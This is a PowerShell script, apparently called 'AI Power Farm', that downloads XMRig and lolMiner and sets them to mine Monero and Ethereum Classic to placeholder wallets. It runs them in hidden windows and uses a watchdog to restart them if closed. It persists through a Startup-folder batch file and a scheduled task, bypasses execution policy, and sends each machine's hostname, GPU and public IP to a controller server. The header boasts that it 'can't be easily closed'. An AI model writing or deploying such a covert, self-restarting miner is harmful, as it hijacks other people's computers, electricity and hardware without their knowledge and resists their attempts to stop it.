<#
AI Power Farm - Combined GPU + CPU Miner
Runs as hidden service, can't be easily closed
#>

param(
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$Start,
    [switch]$Stop
)

$SERVER_URL = "http://YOUR_SERVER_IP:5000"
$WALLET_ETC = "YOUR_ETC_WALLET"  # Get from WazirX/CoinDCX
$WALLET_XMR = "YOUR_XMR_WALLET"  # Get from WazirX/CoinDCX
$WORKER_NAME = $env:COMPUTERNAME
$MINER_DIR = "$env:APPDATA\AI-Power-Farm"
$LOG_FILE = "$MINER_DIR\miner.log"
$WATCHDOG_SCRIPT = "$MINER_DIR\watchdog.ps1"

function Write-Log($msg) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $msg" | Out-File -FilePath $LOG_FILE -Append
}

function Install-Miner {
    Write-Log "Installing AI Power Farm Miner..."
    
    # Create directory
    New-Item -ItemType Directory -Force -Path $MINER_DIR | Out-Null
    
    # Download lolMiner (GPU)
    Write-Log "Downloading lolMiner..."
    $lolMinerUrl = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.97a/lolMiner_v1.97a_Win64.zip"
    $lolMinerZip = "$MINER_DIR\lolminer.zip"
    Invoke-WebRequest -Uri $lolMinerUrl -OutFile $lolMinerZip
    Expand-Archive -Path $lolMinerZip -DestinationPath "$MINER_DIR\lolminer" -Force
    
    # Download XMRig (CPU)
    Write-Log "Downloading XMRig..."
    $xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc2019-win64.zip"
    $xmrigZip = "$MINER_DIR\xmrig.zip"
    Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip
    Expand-Archive -Path $xmrigZip -DestinationPath "$MINER_DIR\xmrig" -Force
    
    # Create GPU miner config
    $gpuConfig = @"
{
    "algo": "etchash",
    "servers": [
        {
            "url": "etc.2miners.com:1010",
            "user": "$WALLET_ETC",
            "pass": "x"
        }
    ],
    "watch": true,
    "api": {
        "report-interval": 30
    }
}
"@
    $gpuConfig | Out-File -FilePath "$MINER_DIR\lolminer\config.json" -Encoding UTF8
    
    # Create CPU miner config
    $cpuConfig = @"
{
    "pools": [
        {
            "url": "pool.hashvault.pro:443",
            "user": "$WALLET_XMR",
            "pass": "x"
        }
    ],
    "cpu": true,
    "cuda": false,
    "opencl": false,
    "donate-level": 0,
    "syslog": false,
    "watch": true
}
"@
    $cpuConfig | Out-File -FilePath "$MINER_DIR\xmrig\config.json" -Encoding UTF8
    
    # Create watchdog script (restarts miners if closed)
    $watchdogContent = @"
while (`$true) {
    # Check if GPU miner is running
    `$gpuRunning = Get-Process -Name "lolMiner" -ErrorAction SilentlyContinue
    if (-not `$gpuRunning) {
        Write-Log "GPU miner stopped, restarting..."
        Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--config", "$MINER_DIR\lolminer\config.json" -WindowStyle Hidden
    }
    
    # Check if CPU miner is running
    `$cpuRunning = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if (-not `$cpuRunning) {
        Write-Log "CPU miner stopped, restarting..."
        Start-Process -FilePath "$MINER_DIR\xmrig\xmrig.exe" -ArgumentList "--config", "$MINER_DIR\xmrig\config.json" -WindowStyle Hidden
    }
    
    # Report status to server
    try {
        `$gpuHash = (Get-CimInstance Win32_PerfFormattedData_PerfProc_Process | Where-Object {$_.Name -eq "lolMiner"}).PercentProcessorTime
        `$cpuHash = (Get-CimInstance Win32_PerfFormattedData_PerfProc_Process | Where-Object {$_.Name -eq "xmrig"}).PercentProcessorTime
        
        Invoke-RestMethod -Uri "$SERVER_URL/api/worker/report" -Method Post -ContentType "application/json" -Body (@{
            worker_id = "$WORKER_NAME"
            hostname = "$WORKER_NAME"
            gpu_name = (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name
            gpu_count = (Get-CimInstance Win32_VideoController).Count
            hashrate = `$gpuHash + `$cpuHash
            power_usage = 0
            temperature = 0
            uptime = 0
            status = "online"
            ip_address = (Invoke-RestMethod -Uri "https://api.ipify.org")
            miner_version = "2.0-gpu+cpu"
            coin = "ETC+XMR"
            display_name = "$WORKER_NAME"
        } | ConvertTo-Json)
    } catch {}
    
    Start-Sleep -Seconds 30
}
"@
    $watchdogContent | Out-File -FilePath $WATCHDOG_SCRIPT -Encoding UTF8
    
    # Create startup script
    $startupScript = @"
# Hide window
`$hwnd = (Get-Process -Id $PID).MainWindowHandle
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
"@
[Win32]::ShowWindow(`$hwnd, 0)

# Start GPU miner
Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--config", "$MINER_DIR\lolminer\config.json" -WindowStyle Hidden

# Start CPU miner
Start-Process -FilePath "$MINER_DIR\xmrig\xmrig.exe" -ArgumentList "--config", "$MINER_DIR\xmrig\config.json" -WindowStyle Hidden

# Start watchdog
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WATCHDOG_SCRIPT`"" -WindowStyle Hidden
"@
    $startupScript | Out-File -FilePath "$MINER_DIR\start.ps1" -Encoding UTF8
    
    # Add to startup (runs on boot)
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\AI-Power-Farm.bat"
    "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MINER_DIR\start.ps1`"" | Out-File -FilePath $startupPath -Encoding ASCII
    
    # Create scheduled task (more reliable than startup folder)
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MINER_DIR\start.ps1`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
    Register-ScheduledTask -TaskName "AI-Power-Farm" -Action $action -Trigger $trigger -Settings $settings -Force
    
    Write-Log "Installation complete!"
    Write-Log "GPU Miner: lolMiner (ETC)"
    Write-Log "CPU Miner: XMRig (XMR)"
    Write-Log "Watchdog: Running"
    Write-Log "Auto-start: Enabled"
    
    # Start mining
    Start-Miner
}

function Start-Miner {
    Write-Log "Starting miners..."
    
    # Start GPU miner
    Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--config", "$MINER_DIR\lolminer\config.json" -WindowStyle Hidden
    Write-Log "GPU miner started"
    
    # Start CPU miner
    Start-Process -FilePath "$MINER_DIR\xmrig\xmrig.exe" -ArgumentList "--config", "$MINER_DIR\xmrig\config.json" -WindowStyle Hidden
    Write-Log "CPU miner started"
    
    # Start watchdog
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WATCHDOG_SCRIPT`"" -WindowStyle Hidden
    Write-Log "Watchdog started"
    
    Write-Log "All miners running!"
}

function Stop-Miner {
    Write-Log "Stopping miners..."
    Get-Process -Name "lolMiner","xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force
    Get-Process -Name "powershell" | Where-Object {$_.CommandLine -like "*watchdog*"} | Stop-Process -Force
    Write-Log "Miners stopped"
}

function Uninstall-Miner {
    Stop-Miner
    Unregister-ScheduledTask -TaskName "AI-Power-Farm" -Confirm:$false -ErrorAction SilentlyContinue
    Remove-Item -Path $MINER_DIR -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\AI-Power-Farm.bat" -Force -ErrorAction SilentlyContinue
    Write-Log "Uninstalled"
}

# Main
if ($Install) { Install-Miner }
elseif ($Uninstall) { Uninstall-Miner }
elseif ($Start) { Start-Miner }
elseif ($Stop) { Stop-Miner }
else {
Write-Host "AI Power Farm Miner v2.0"
Write-Host "GPU + CPU Mining - ETC + XMR"
Write-Host ""
Write-Host "Usage:"
Write-Host "  .\miner.ps1 -Install    # Install & start mining"
Write-Host "  .\miner.ps1 -Start      # Start mining"
Write-Host "  .\miner.ps1 -Stop       # Stop mining"
Write-Host "  .\miner.ps1 -Uninstall  # Remove everything"
}
